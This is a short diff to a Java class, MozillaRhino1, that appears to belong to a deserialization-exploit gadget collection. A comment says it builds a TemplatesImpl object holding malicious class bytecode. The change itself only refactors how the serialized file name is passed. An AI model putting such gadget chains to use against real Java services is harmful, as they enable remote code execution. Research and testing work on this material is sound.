@@ -14,8 +14,6 @@ import java.lang.reflect.Method;
  */
 public class MozillaRhino1 {
 
-	public static String fileName = "MozillaRhino1.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -62,8 +60,8 @@ public class MozillaRhino1 {
 		valField.setAccessible(true);
 		valField.set(exception, nativeError);
 
-		SerializeUtil.writeObjectToFile(exception, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(exception);
+		SerializeUtil.readFileObject();
 	}
 
 }
